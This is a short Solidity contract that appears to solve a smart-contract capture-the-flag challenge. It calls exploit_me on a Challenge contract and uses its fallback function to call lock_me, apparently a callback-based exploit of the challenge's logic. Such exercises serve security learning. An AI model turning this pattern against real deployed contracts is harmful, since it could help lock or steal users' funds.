// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "./Challenge.sol";

contract Attack {
    Challenge challenge;

    constructor(address _challengeAddress) {
        challenge = Challenge(_challengeAddress);
    }

    function attack(string memory _name) public {
        challenge.exploit_me(_name);
    }

    fallback() external {
        challenge.lock_me();
    }
}